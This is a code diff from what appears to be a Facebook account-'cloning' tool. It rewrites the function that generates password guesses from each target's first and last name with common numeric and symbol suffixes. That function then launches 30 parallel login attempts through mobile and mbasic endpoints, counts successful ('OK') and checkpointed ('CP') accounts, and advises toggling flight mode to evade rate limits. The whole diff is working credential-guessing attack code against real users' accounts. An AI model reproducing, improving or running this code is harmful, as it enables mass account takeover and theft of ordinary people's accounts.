@@ -619,88 +619,79 @@ def setting():
 #-------------------[ BAGIAN-WORDLIST ]------------#
  
 def passwrd():
-	os.system('clear')
-	print(logo)
-	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
-	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
-	linex()
-	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
-	linex()
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			pwv = []
-			frs = nmf.split(' ')[0]
-			try:
-				lst = nmf.split(' ')[1]
-			except:
-				lst = ''
-				
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+lst)
-					pwv.append(frs+'@'+lst)
-					pwv.append(frs+'#'+lst)
-					pwv.append(lst+frs)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'321')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@1234')
-					pwv.append(frs+lst+'123')
-					pwv.append(frs+lst+'1234')
-					pwv.append(frs+lst+'@123')
-					pwv.append(frs+lst+'@1234')
-					pwv.append(frs+lst+'321')
-					pwv.append(lst+frs+'123')
-					pwv.append(lst+frs+'111')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(frs+lst)
-					pwv.append(frs+'@'+lst)
-					pwv.append(frs+'#'+lst)
-					pwv.append(lst+frs)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'321')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@1234')
-					pwv.append(frs+lst+'123')
-					pwv.append(frs+lst+'1234')
-					pwv.append(frs+lst+'@123')
-					pwv.append(frs+lst+'@1234')
-					pwv.append(frs+lst+'321')
-					pwv.append(lst+frs+'123')
-					pwv.append(lst+frs+'111')
+    os.system('clear')
+    print(logo)
+    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
+    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
+    print('\033[0;97m===============================================')
+    with tred(max_workers=30) as pool:
+        for yuzong in id2:
+            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+            frs = nmf.split(' ')[0]
+            pwv = []
+            if len(nmf)<6:
+                if len(frs)<3:
+                    pass
+                else:
+                    pwv.append(nmf+'12')
+                    pwv.append(nmf+'123')
+                    pwv.append(nmf+'1234')
+                    pwv.append(nmf+'12345')
+                    pwv.append(nmf+'@12')
+                    pwv.append(nmf+'@123')
+                    pwv.append(nmf+'@1234')
+                    pwv.append(nmf+'@12345')
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'@')
+                    pwv.append(frs+'@12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    
+            else:
+                if len(frs)<3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(frs+'1122')
+                    pwv.append(frs+'11')
+                    pwv.append(frs+'111')
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'@')
+                    pwv.append(frs+'@12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
             if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'mobile' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'touch' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'mbasic' in method:
-				pool.submit(crackfree,idf,pwv)
-			else:
-				pool.submit(crackfree,idf,pwv)
-    print('\033[0;91m------------------------------------------')
-    print('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mCLONING COMPLETE TIME :\033[0;91m'+time.strftime("%H:%M")+" "+ tag)
-    print('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK :\033[0;91m %s '%(ok))
-    print('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mCP :\033[0;91m%s '%(cp))
-    print('\033[0;91m------------------------------------------')
-    woi = input('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TO BACK')
-    os.system("python v4.py")
+                for xpwd in pwnya:
+                    pwv.append(xpwd)
+            else:pass
+            if 'mobile' in method:
+                pool.submit(crack,idf,pwv)
+            elif 'free' in method:
+                pool.submit(crackfree,idf,pwv)
+            elif 'touch' in method:
+                pool.submit(crackfree,idf,pwv)
+            elif 'mbasic' in method:
+                pool.submit(crackfree,idf,pwv)
+            else:
+                pool.submit(crackfree,idf,pwv)
+    print('\n\033[1;37m===================================')
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
+    print('\n\033[1;37m===================================')
+    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
+    os.system("python nono.py")
     exit()
  
 #--------------------[ METODE-B-API ]-----------------#
